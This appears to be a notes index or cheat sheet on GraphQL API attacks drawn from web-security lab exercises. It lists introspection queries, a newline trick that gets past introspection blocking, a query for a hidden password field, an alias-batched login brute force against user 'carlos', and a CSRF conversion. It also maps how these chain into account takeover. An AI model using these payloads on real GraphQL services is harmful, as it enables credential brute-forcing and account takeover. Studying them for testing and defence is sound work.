# GraphQL API vulnerabilities - topic overview & router

GraphQL's introspection system exposes the full API schema; developers leave it enabled. Exposed or enumerable fields return sensitive data (passwords, hidden posts). Rate-limit bypass via aliases lets you send 100 mutations in one request. GraphQL mutations over POST with content-type `x-www-form-urlencoded` lack CSRF protection.

## 30-second quick reference

```graphql
# 1. Probe for GraphQL endpoint
GET /graphql   /api   /graphql/v1   /gql   -> look for {"errors":[]} or "Query not present"

# 2. Send introspection (Burp: right-click -> GraphQL -> Set introspection query)
{"query":"{__schema{queryType{name}}}"}

# 3. Bypass introspection block (__schema{ -> blocked; add newline after __schema)
{"query":"query{__schema\n{queryType{name}}}"}

# 4. Access private field (postPassword not shown in UI)
{"query":"{getBlogPost(id:3){title postPassword}}"}

# 5. Alias-based brute force (100 mutations, 1 request)
mutation { bruteforce0:login(input:{username:"carlos",password:"123456"}){token success}
           bruteforce1:login(input:{username:"carlos",password:"password"}){token success} ... }

# 6. CSRF over GraphQL (convert to form-urlencoded POST)
query=mutation+changeEmail...&variables={...}
```

## Decision map

| Observation | Sub-technique | Attack |
|---|---|---|
| Hidden/private fields in schema | [Introspection-and-enumeration](Introspection-and-enumeration/) | introspection -> add field to query |
| Login mutation + rate limit | [Brute-force-bypass-and-CSRF](Brute-force-bypass-and-CSRF/) | aliases -> 100 logins in 1 request |
| Email-change mutation + no CSRF token | [Brute-force-bypass-and-CSRF](Brute-force-bypass-and-CSRF/) | convert to form-urlencoded -> CSRF PoC |

## Sub-technique folders
- `Introspection-and-enumeration/` - schema enumeration, private fields, hidden endpoints (3 labs)
- `Brute-force-bypass-and-CSRF/` - alias-based brute force, GraphQL CSRF (2 labs)

## Root cause
GraphQL introspection exposes the entire API contract including sensitive types/fields developers forgot to restrict. Rate limits apply per-request not per-mutation, so aliases multiply queries. GraphQL POSTs with `x-www-form-urlencoded` bypass CSRF token requirements.

## Find it
- Any API-like endpoint: probe with `{__typename}` universal query.
- All mutations in Burp GraphQL tab -> check for unprotected sensitive operations.
- Login mutations -> test rate limiting -> bypass with aliases.

## Chaining
- Introspection -> admin credentials -> account takeover
- GraphQL CSRF -> change victim's email -> account takeover
- Alias brute -> credential stuffing at scale

## Tools
- **Burp GraphQL tab** - visual query editor, introspection helper, site map save
- **Burp Intruder** - or GraphQL alias batching for brute force

## References
- https://portswigger.net/web-security/graphql
